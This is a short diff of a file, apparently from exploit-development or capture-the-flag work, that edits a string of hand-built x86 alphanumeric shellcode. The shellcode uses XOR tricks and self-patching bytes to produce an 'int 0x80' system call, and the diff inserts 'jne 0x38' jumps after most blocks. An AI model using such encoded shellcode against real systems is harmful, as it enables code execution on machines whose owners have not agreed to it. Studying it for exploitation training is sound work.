@@ -50,36 +50,44 @@ shellcode = """
     xor al,0x30
     xor al,0x35
     dec eax
+    jne 0x38
 
     xor eax,0x70707050
     push edx
+    jne 0x38
 
     xor eax,0x70705a30
     push edx
+    jne 0x38
 
     xor ecx,[eax+0x61]
     pop eax
     xor al,0x4f
+    jne 0x38
 
     push eax
     xor al,0x30
     push eax
     pop edx
     inc edx
+    jne 0x38
     
     push edx
     pop eax
     xor al,0x78
     push eax
     pop edx
+    jne 0x38
 
     xor byte ptr [ecx+0x44],dl
     xor byte ptr [ecx+0x45],dl
+    jne 0x38
 
     pop eax
     xor al,0x4c
     inc edx
     \x35\x78 -> int 0x80
+    jne 0x38
 """
 
 shell1 = "X4045Hu8"
